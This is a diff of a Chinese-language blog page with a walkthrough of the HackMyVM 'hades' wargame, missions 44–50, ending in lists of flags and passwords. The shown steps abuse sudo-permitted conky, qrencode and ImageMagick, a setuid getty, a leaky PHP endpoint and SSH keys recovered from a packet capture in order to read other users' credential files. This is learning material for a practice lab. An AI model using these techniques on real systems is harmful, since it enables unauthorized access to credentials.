-<p><code class="notranslate">/etc/hosts</code> 里有 <code class="notranslate">127.0.0.1 whatsmyPass.hmv</code>。访问该虚拟主机。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nephele@hades:<span class="pl-k">~</span>$ curl -s http://whatsmyPass.hmv/
-HXisrOPSdTcSSTEyyaLn</pre></div>
+<p><code>/etc/hosts</code> 里有 <code>127.0.0.1 whatsmyPass.hmv</code>。访问该虚拟主机。</p>
+<pre lang="bash"><code>nephele@hades:~$ curl -s http://whatsmyPass.hmv/
+HXisrOPSdTcSSTEyyaLn
+</code></pre>
 <ul>
-<li><strong>nyx</strong>: <code class="notranslate">HXisrOPSdTcSSTEyyaLn</code></li>
+<li><strong>nyx</strong>: <code>HXisrOPSdTcSSTEyyaLn</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 44: nyx -&gt; pallas</h2>
 <ul>
 <li><strong>任务</strong>：pallas 桌面用 conky 调过。</li>
 </ul>
-<p>nyx 能 <code class="notranslate">sudo -u pallas conky</code>。conky 配置是 Lua，可 <code class="notranslate">exec</code> 任意命令。<code class="notranslate">/var/cache/apt/pa.txt</code>（root:pallas 640）是密码文件。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nyx@hades:<span class="pl-k">~</span>$ cat <span class="pl-k">&gt;</span> /run/lock/c.conf <span class="pl-s"><span class="pl-k">&lt;&lt;</span>'<span class="pl-k">EOF</span>'</span>
-<span class="pl-s">conky.config={out_to_console=true,total_run_times=1}</span>
-<span class="pl-s">conky.text=[[${exec cat /var/cache/apt/pa.txt}]]</span>
-<span class="pl-s"><span class="pl-k">EOF</span></span>
-nyx@hades:<span class="pl-k">~</span>$ sudo -u pallas /usr/bin/conky -c /run/lock/c.conf -D
-wWxyXnNbmjxNMEAIjbjT</pre></div>
+<p>nyx 能 <code>sudo -u pallas conky</code>。conky 配置是 Lua，可 <code>exec</code> 任意命令。<code>/var/cache/apt/pa.txt</code>（root:pallas 640）是密码文件。</p>
+<pre lang="bash"><code>nyx@hades:~$ cat &gt; /run/lock/c.conf &lt;&lt;'EOF'
+conky.config={out_to_console=true,total_run_times=1}
+conky.text=[[${exec cat /var/cache/apt/pa.txt}]]
+EOF
+nyx@hades:~$ sudo -u pallas /usr/bin/conky -c /run/lock/c.conf -D
+wWxyXnNbmjxNMEAIjbjT
+</code></pre>
 <ul>
-<li><strong>pallas</strong>: <code class="notranslate">wWxyXnNbmjxNMEAIjbjT</code></li>
+<li><strong>pallas</strong>: <code>wWxyXnNbmjxNMEAIjbjT</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 45: pallas -&gt; pandora</h2>
 <ul>
 <li><strong>任务</strong>：pandora 喜欢方块（QR 码）。</li>
 </ul>
-<p>pallas 能 <code class="notranslate">sudo -u pandora qrencode</code>。<code class="notranslate">/usr/bin/pandora</code>（root:pandora 640，21 字节）是密码文件。qrencode <code class="notranslate">-r</code> 读取文件并编码成 QR，再解码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">pallas@hades:<span class="pl-k">~</span>$ sudo -u pandora /usr/bin/qrencode -r /usr/bin/pandora -o /run/lock/qr.png
-$ python3 -c <span class="pl-s"><span class="pl-pds">"</span>from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('/run/lock/qr.png'))[0].data.decode())<span class="pl-pds">"</span></span>
-HhVHfmbBIiZbZSgcgadh</pre></div>
+<p>pallas 能 <code>sudo -u pandora qrencode</code>。<code>/usr/bin/pandora</code>（root:pandora 640，21 字节）是密码文件。qrencode <code>-r</code> 读取文件并编码成 QR，再解码。</p>
+<pre lang="bash"><code>pallas@hades:~$ sudo -u pandora /usr/bin/qrencode -r /usr/bin/pandora -o /run/lock/qr.png
+$ python3 -c &quot;from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('/run/lock/qr.png'))[0].data.decode())&quot;
+HhVHfmbBIiZbZSgcgadh
+</code></pre>
 <ul>
-<li><strong>pandora</strong>: <code class="notranslate">HhVHfmbBIiZbZSgcgadh</code></li>
+<li><strong>pandora</strong>: <code>HhVHfmbBIiZbZSgcgadh</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 46: pandora -&gt; penelope</h2>
 <ul>
 <li><strong>任务</strong>：penelope 让我们做点什么。</li>
 </ul>
-<p><code class="notranslate">/usr/bin/getty</code> 是 setuid penelope 的。<code class="notranslate">/etc/pene.conf</code>（penelope:penelope 400）是密码文件。getty <code class="notranslate">-f</code> 指定 issue 文件，以 penelope 身份读并显示。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">pandora@hades:<span class="pl-k">~</span>$ /usr/bin/getty -f /etc/pene.conf -n -L - /dev/pts/7 115200
-anoRxVKulaoMNKMrddVe</pre></div>
+<p><code>/usr/bin/getty</code> 是 setuid penelope 的。<code>/etc/pene.conf</code>（penelope:penelope 400）是密码文件。getty <code>-f</code> 指定 issue 文件，以 penelope 身份读并显示。</p>
+<pre lang="bash"><code>pandora@hades:~$ /usr/bin/getty -f /etc/pene.conf -n -L - /dev/pts/7 115200
+anoRxVKulaoMNKMrddVe
+</code></pre>
 <ul>
-<li><strong>penelope</strong>: <code class="notranslate">anoRxVKulaoMNKMrddVe</code></li>
+<li><strong>penelope</strong>: <code>anoRxVKulaoMNKMrddVe</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 47: penelope -&gt; phoebe</h2>
 <ul>
-<li><strong>任务</strong>：给 <a href="http://localhost/request.php" rel="nofollow">http://localhost/request.php</a> 一个 user 和 password，phoebe 可能给我们她的密码。</li>
+<li><strong>任务</strong>：给 http://localhost/request.php 一个 user 和 password，phoebe 可能给我们她的密码。</li>
 </ul>
-<p>request.php 对<strong>任意用户名配任意已知密码</strong>做验证，部分组合返回其他用户的密码（只差一两个字符）。关键是要把<strong>所有</strong>已知凭据（含 level 00 的 <code class="notranslate">hacker</code>/<code class="notranslate">begood!</code>）都交叉尝试。<code class="notranslate">aphrodite</code> + <code class="notranslate">begood!</code>（hacker 的密码）返回 phoebe 的密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">penelope@hades:<span class="pl-k">~</span>$ curl -s <span class="pl-s"><span class="pl-pds">"</span>http://localhost/request.php?user=aphrodite&amp;password=begood!<span class="pl-pds">"</span></span>
-FPLwKmmKhcWAwRxiaBDN</pre></div>
+<p>request.php 对<strong>任意用户名配任意已知密码</strong>做验证，部分组合返回其他用户的密码（只差一两个字符）。关键是要把<strong>所有</strong>已知凭据（含 level 00 的 <code>hacker</code>/<code>begood!</code>）都交叉尝试。<code>aphrodite</code> + <code>begood!</code>（hacker 的密码）返回 phoebe 的密码。</p>
+<pre lang="bash"><code>penelope@hades:~$ curl -s &quot;http://localhost/request.php?user=aphrodite&amp;password=begood!&quot;
+FPLwKmmKhcWAwRxiaBDN
+</code></pre>
 <ul>
-<li><strong>phoebe</strong>: <code class="notranslate">FPLwKmmKhcWAwRxiaBDN</code></li>
+<li><strong>phoebe</strong>: <code>FPLwKmmKhcWAwRxiaBDN</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 48: phoebe -&gt; rhea</h2>
 <ul>
 <li><strong>任务</strong>：rhea 喜欢图片。</li>
 </ul>
-<p>phoebe 能 <code class="notranslate">sudo -u rhea convert</code>（ImageMagick）。<code class="notranslate">/usr/sbin/re</code>（root:rhea 640，21 字节）是密码文件。用 <code class="notranslate">convert text:</code> 读取并渲染成 PNG，再 OCR。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">phoebe@hades:<span class="pl-k">~</span>$ sudo -u rhea /usr/bin/convert text:/usr/sbin/re /run/lock/re.png
+<p>phoebe 能 <code>sudo -u rhea convert</code>（ImageMagick）。<code>/usr/sbin/re</code>（root:rhea 640，21 字节）是密码文件。用 <code>convert text:</code> 读取并渲染成 PNG，再 OCR。</p>
+<pre lang="bash"><code>phoebe@hades:~$ sudo -u rhea /usr/bin/convert text:/usr/sbin/re /run/lock/re.png
 $ tesseract /run/lock/re.png stdout --psm 7
-iKVVfwEDFbBpTnlnKZKr</pre></div>
+iKVVfwEDFbBpTnlnKZKr
+</code></pre>
 <ul>
-<li><strong>rhea</strong>: <code class="notranslate">iKVVfwEDFbBpTnlnKZKr</code></li>
+<li><strong>rhea</strong>: <code>iKVVfwEDFbBpTnlnKZKr</code></li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 49: rhea -&gt; selene</h2>
 <ul>
 <li><strong>任务</strong>：selene 想告诉我们什么。</li>
 </ul>
-<p><code class="notranslate">/pwned/rhea/capture.pcapng</code> 是网络抓包，含一次 <code class="notranslate">GET /id.zip</code> 的 HTTP 传输。从 pcap 提取 zip，解压出 SSH 私钥 <code class="notranslate">id_rsa</code>，用它登录 selene。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">rhea@hades:<span class="pl-k">~</span>$ base64 -w0 capture.pcapng <span class="pl-k">|</span> (本地 base64 -d <span class="pl-k">&gt;</span> capture.pcapng)
-$ tshark -r capture.pcapng --export-objects http,.   <span class="pl-c"><span class="pl-c">#</span> 本地执行</span>
-$ unzip id.zip  <span class="pl-c"><span class="pl-c">#</span> → id_rsa</span>
+<p><code>/pwned/rhea/capture.pcapng</code> 是网络抓包，含一次 <code>GET /id.zip</code> 的 HTTP 传输。从 pcap 提取 zip，解压出 SSH 私钥 <code>id_rsa</code>，用它登录 selene。</p>
+<pre lang="bash"><code>rhea@hades:~$ base64 -w0 capture.pcapng | (本地 base64 -d &gt; capture.pcapng)
+$ tshark -r capture.pcapng --export-objects http,.   # 本地执行
+$ unzip id.zip  # → id_rsa
 $ chmod 600 id_rsa
-$ ssh -i id_rsa -p 6666 selene@hades.hackmyvm.eu</pre></div>
+$ ssh -i id_rsa -p 6666 selene@hades.hackmyvm.eu
+</code></pre>
 <ul>
 <li><strong>selene</strong>: （SSH 私钥登录，无密码）</li>
 </ul>
-<hr>
+<hr />
 <h2>Mission 50: selene -&gt; maria (CONGRATS)</h2>
 <ul>
 <li><strong>任务</strong>：maria... 我好像见过她的密码。</li>
 </ul>
-<p>hera 的 <code class="notranslate">.ssh/id_rsa</code>（私钥）的公钥在 maria 的 authorized_keys 里。用 hera 的私钥登录 maria。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">selene@hades:<span class="pl-k">~</span>$ ssh -i /tmp/hera_id_rsa -p 6666 maria@hades.hackmyvm.eu
-maria@hades:<span class="pl-k">~</span>$ cat congrats.txt
-<span class="pl-c"><span class="pl-c">#</span>###############</span>
-<span class="pl-c"><span class="pl-c">#</span>   CONGRATS   #</span>
-<span class="pl-c"><span class="pl-c">#</span>###############</span>
-Congrats You did it<span class="pl-k">!!</span> ... Or maybe this is not the last level<span class="pl-k">?</span>
-maria@hades:<span class="pl-k">~</span>$ cat .loca1
-^AvzutwxEYLasCAiUMBLA^</pre></div>
+<p>hera 的 <code>.ssh/id_rsa</code>（私钥）的公钥在 maria 的 authorized_keys 里。用 hera 的私钥登录 maria。</p>
+<pre lang="bash"><code>selene@hades:~$ ssh -i /tmp/hera_id_rsa -p 6666 maria@hades.hackmyvm.eu
+maria@hades:~$ cat congrats.txt
+################
+#   CONGRATS   #
+################
+Congrats You did it!! ... Or maybe this is not the last level?
+maria@hades:~$ cat .loca1
+^AvzutwxEYLasCAiUMBLA^
+</code></pre>
 <ul>
-<li><strong>maria</strong>: （hera 的 SSH 私钥登录，CONGRATS，隐藏 flag <code class="notranslate">^AvzutwxEYLasCAiUMBLA^</code>）</li>
+<li><strong>maria</strong>: （hera 的 SSH 私钥登录，CONGRATS，隐藏 flag <code>^AvzutwxEYLasCAiUMBLA^</code>）</li>
 </ul>
-<hr>
+<hr />
 <h1>Flag</h1>
-<pre class="notranslate"><code class="notranslate">25. delia:       ^QfaHPyEqMepsOdMxQCQ^
+<pre><code>25. delia:       ^QfaHPyEqMepsOdMxQCQ^
 26. demeter:     ^JiviWHRVRZLSfjBuwAi^
 27. echo:        ^abeDeOxlPMAABepeBHy^
 28. eos:         ^OsoLytPlXEjvinhCNyy^
@@ -465,7 +481,7 @@ maria@hades:<span class="pl-k">~</span>$ cat .loca1
 50. maria:       ^zBKjbLoxNAQFKeouNnm^
 </code></pre>
 <h1>Pass</h1>
-<pre class="notranslate"><code class="notranslate">25: delia/bNCvocyOpoMVeCtxrhTt
+<pre><code>25: delia/bNCvocyOpoMVeCtxrhTt
 26: demeter/FkyuXkkJNONDChoaKzOI
 27: echo/GztROerShmiyiCIlfepG
 28: eos/CWBKRQX
@@ -491,7 +507,8 @@ maria@hades:<span class="pl-k">~</span>$ cat .loca1
 48: rhea/iKVVfwEDFbBpTnlnKZKr
 49: selene/(ssh 私钥)
 50: maria/(hera 的 ssh 私钥)
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -516,7 +533,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -563,70 +580,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
